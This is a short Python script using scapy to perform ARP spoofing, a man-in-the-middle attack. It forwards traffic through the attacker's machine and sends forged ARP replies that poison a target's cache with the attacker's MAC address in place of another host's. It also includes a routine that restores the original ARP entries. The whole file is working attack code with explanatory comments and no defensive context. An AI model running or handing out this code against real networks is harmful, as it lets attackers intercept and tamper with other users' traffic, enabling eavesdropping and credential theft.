from scapy.all import Ether, ARP, srp, send
from ip_router import IP_Router
import time
import os
import sys


def enableIPRoute():
    router = IP_Router()
    router.start()


def getMac(ip):
    # Initiates an ARP resolution between your machine and the target machine.
    # Tells the wifi router to ask "Who has <ip>? Respond with your MAC address."
    # Your IP is sent in this request by default so that the response is directly sent to your machine.
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0) 
    if ans:
        return ans[0][1].src
    

def spoof(target_ip, spoofed_ip):
    target_mac = getMac(target_ip)
    spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, op=2)  # Unless explicitly declared in this function, ARP() will use your MAC address as the default sender MAC address
    send(spoofed_arp, verbose=1)
    print("Spoofed ARP sent to ", target_ip, ".")


def unspoof(target_ip, gateway_ip):
    target_mac = getMac(target_ip)
    gateway_mac = getMac(gateway_ip)
    unspoofing_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
    send(unspoofing_arp, verbose=1, count=7)
    print("Original ARPs restrored.")

